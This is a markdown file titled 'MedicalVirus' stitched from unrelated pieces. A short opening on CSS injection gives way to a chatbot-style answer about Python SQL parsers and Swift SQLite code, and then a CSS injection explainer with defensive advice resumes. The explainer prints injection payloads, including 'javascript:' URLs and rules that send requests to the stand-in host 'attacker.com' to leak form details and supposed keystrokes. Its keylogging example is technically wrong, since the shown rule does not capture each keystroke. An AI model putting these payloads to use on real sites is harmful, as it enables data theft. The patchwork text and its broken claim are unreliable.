# MedicalVirus

Code injection through CSS is a concept often associated with exploiting vulnerabilities in web applications, particularly when an attacker can inject or manipulate CSS in a way that triggers unintended behavior. Let's break this down:

### Python SQL Parsers for Snowflake and PostgreSQL

If you're looking to parse SQL for Snowflake or PostgreSQL in Python, there are several libraries available that can help you analyze and manipulate SQL queries. Here are a few popular SQL parser libraries:

1. **sqlparse**: A non-validating SQL parser for Python. It provides a simple API to parse and format SQL statements.
2. **mo_sql_parsing**: A SQL parser that converts SQL to a dictionary format.
3. **sqlglot**: A more advanced SQL parser that supports various SQL dialects including PostgreSQL.

#### 1. Using `sqlparse`

`sqlparse` is a simple and flexible SQL parser. It allows you to tokenize, parse, and format SQL statements.

##### Installation:
```sh
pip install sqlparse
```

##### Example Usage:
```python
import sqlparse

# Example SQL query
sql = "SELECT * FROM Users WHERE Username = 'admin';"

# Parse the SQL query
parsed = sqlparse.parse(sql)

# Iterate over parsed statements
for statement in parsed:
    print(statement)

# Format the SQL query
formatted_sql = sqlparse.format(sql, reindent=True, keyword_case='upper')
print(formatted_sql)
```

#### 2. Using `mo_sql_parsing`

`mo_sql_parsing` converts SQL statements into a dictionary format, which can be useful for further analysis and processing.

##### Installation:
```sh
pip install mo-sql-parsing
```

##### Example Usage:
```python
import mo_sql_parsing as msp

# Example SQL query
sql = "SELECT * FROM Users WHERE Username = 'admin';"

# Parse the SQL query to a dictionary
parsed = msp.parse(sql)

# Print the parsed SQL as a dictionary
print(parsed)
```

#### 3. Using `sqlglot`

`sqlglot` is an advanced SQL parser that supports multiple SQL dialects, including PostgreSQL.

##### Installation:
```sh
pip install sqlglot
```

##### Example Usage:
```python
import sqlglot

# Example SQL query
sql = "SELECT * FROM Users WHERE Username = 'admin';"

# Parse the SQL query
parsed = sqlglot.parse_one(sql)

# Print the parsed SQL object
print(parsed)

# Convert back to SQL string
sql_string = parsed.sql()
print(sql_string)
```

### Databases for Swift

When developing iOS applications with Swift, developers commonly use a variety of databases depending on their needs:

1. **Core Data**: Apple's framework for managing the model layer objects in an application. It's ideal for complex object graphs and provides built-in support for iCloud syncing.
2. **SQLite**: A powerful, lightweight, disk-based database that doesn’t require a separate server process. It's a popular choice for simpler data storage needs.
3. **Realm**: A mobile database that is designed to be fast and easy to use. It offers an object-oriented interface and is suitable for both simple and complex data models.
4. **Firebase Firestore**: A NoSQL cloud database that allows you to store and sync data between users and devices in real-time.

#### Example: Using SQLite in Swift

##### Step 1: Add SQLite to Your Project

Ensure that SQLite is included in your project by adding the necessary import statements.

##### Step 2: Example Code

Here’s a simple example of how you can use SQLite in a Swift application:

```swift
import SQLite3

class DatabaseManager {
    var db: OpaquePointer?
    
    init() {
        db = openDatabase()
        createTable()
    }
    
    func openDatabase() -> OpaquePointer? {
        var db: OpaquePointer?
        let fileURL = try! FileManager.default
            .url(for: .documentDirectory, in: .userDomainMask, appropriateFor: nil, create: false)
            .appendingPathComponent("TestDatabase.sqlite")
        
        if sqlite3_open(fileURL.path, &db) != SQLITE_OK {
            print("Failed to open database.")
            return nil
        } else {
            print("Successfully opened database.")
            return db
        }
    }
    
    func createTable() {
        let createTableString = """
        CREATE TABLE IF NOT EXISTS Contact(
        Id INTEGER PRIMARY KEY,
        Name TEXT,
        Phone TEXT);
        """
        
        var createTableStatement: OpaquePointer?
        if sqlite3_prepare_v2(db, createTableString, -1, &createTableStatement, nil) == SQLITE_OK {
            if sqlite3_step(createTableStatement) == SQLITE_DONE {
                print("Table created.")
            } else {
                print("Table could not be created.")
            }
        } else {
            print("CREATE TABLE statement could not be prepared.")
        }
        sqlite3_finalize(createTableStatement)
    }
    
    func insert(name: String, phone: String) {
        let insertStatementString = "INSERT INTO Contact (Name, Phone) VALUES (?, ?);"
        var insertStatement: OpaquePointer?
        
        if sqlite3_prepare_v2(db, insertStatementString, -1, &insertStatement, nil) == SQLITE_OK {
            sqlite3_bind_text(insertStatement, 1, NSString(string: name).utf8String, -1, nil)
            sqlite3_bind_text(insertStatement, 2, NSString(string: phone).utf8String, -1, nil)
            
            if sqlite3_step(insertStatement) == SQLITE_DONE {
                print("Successfully inserted row.")
            } else {
                print("Could not insert row.")
            }
        } else {
            print("INSERT statement could not be prepared.")
        }
        sqlite3_finalize(insertStatement)
    }
    
    func query() {
        let queryStatementString = "SELECT * FROM Contact;"
        var queryStatement: OpaquePointer?
        
        if sqlite3_prepare_v2(db, queryStatementString, -1, &queryStatement, nil) == SQLITE_OK {
            while sqlite3_step(queryStatement) == SQLITE_ROW {
                let id = sqlite3_column_int(queryStatement, 0)
                let name = String(describing: String(cString: sqlite3_column_text(queryStatement, 1)))
                let phone = String(describing: String(cString: sqlite3_column_text(queryStatement, 2)))
                
                print("Query Result:")
                print("\(id) | \(name) | \(phone)")
            }
        } else {
            print("SELECT statement could not be prepared.")
        }
        sqlite3_finalize(queryStatement)
    }
}

let dbManager = DatabaseManager()
dbManager.insert(name: "John Doe", phone: "123456789")
dbManager.query()
```

### Explanation:

- **SQLite**: A lightweight database that’s easy to integrate with Swift using the `SQLite3` library.
- **DatabaseManager**: A class to manage the database connection, create tables, insert data, and query data.

These examples should help you get started with parsing SQL in Python and using databases in Swift. Let me know if you need further assistance!

---

### **1. Understanding CSS Injection**
CSS injection occurs when a web application allows user input to be included in a style block or as part of a style attribute without proper sanitization. If attackers can control the input, they may manipulate how the page is displayed or interact with sensitive data.

### **2. Example of CSS Injection**
Suppose a web application has an input form that includes user-supplied input directly in the `<style>` tag or `style` attribute. An attacker might exploit it like this:

#### Vulnerable Code:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>CSS Injection Example</title>
    <style>
        .user-style {
            color: black; /* User-controlled input */
        }
    </style>
</head>
<body>
    <div class="user-style">User content here</div>
</body>
</html>
```

If the `color` value is derived from user input without sanitization, an attacker might inject:

```css
color: black; background-image: url('javascript:alert(1)');
```

This could trigger a JavaScript execution in some browsers, but modern browsers typically block `javascript:` URLs in CSS due to security updates.

---

### **3. CSS Injection Leading to Information Disclosure**
In some cases, attackers might leverage CSS to infer sensitive information (e.g., the dimensions or visibility of certain elements):

#### Example:
```css
input[type="password"] {
    background: url('http://attacker.com/log?password-input-exists');
}
```

This sends a request to the attacker's server whenever the targeted CSS rule matches, which might reveal information about the user's form inputs.

---

### **4. Defenses Against CSS Injection**
To protect against CSS injection, follow these best practices:

- **Validate and Sanitize Inputs:** Never trust user input directly. Use input validation and sanitization techniques.
- **Content Security Policy (CSP):** Implement a strict CSP to prevent loading malicious resources or executing inline styles/scripts.
- **Escape Outputs:** Properly escape any user-supplied input included in CSS or HTML attributes.
- **Use Whitelists for CSS Properties:** Limit allowable values to a predefined safe set.
- **Avoid Inline CSS:** Avoid dynamically adding user-controlled data to inline styles.

---

### **5. CSS Injection with Inline Styles**
Injection can also occur in attributes like `style`. For example:

```html
<div style="background-color: {{userInput}}">Content</div>
```

If `userInput` is not sanitized, it could contain something like:

```css
background-color: red; background-image: url('javascript:alert(1)');
```

This could manipulate styles or attempt to execute JavaScript.

---

### **6. Real-World Attack Example**
CSS injection can be used creatively to perform pixel-stealing attacks or keylogging:

#### Example: Keylogging
Attackers inject styles that reveal information about keystrokes:
```css
input[type="text"]::first-letter {
    background: url('http://attacker.com/char?c=a');
}
```

For every keystroke, the browser sends a request to `attacker.com` with the input's first letter.

---

### Summary
While CSS injection isn't as directly dangerous as JavaScript injection (e.g., XSS), it can still lead to:

- Visual manipulation of the page.
- Information leakage.
- Resource-based attacks.

To prevent CSS injection, always validate and sanitize user inputs, escape outputs, and enforce a strong Content Security Policy.
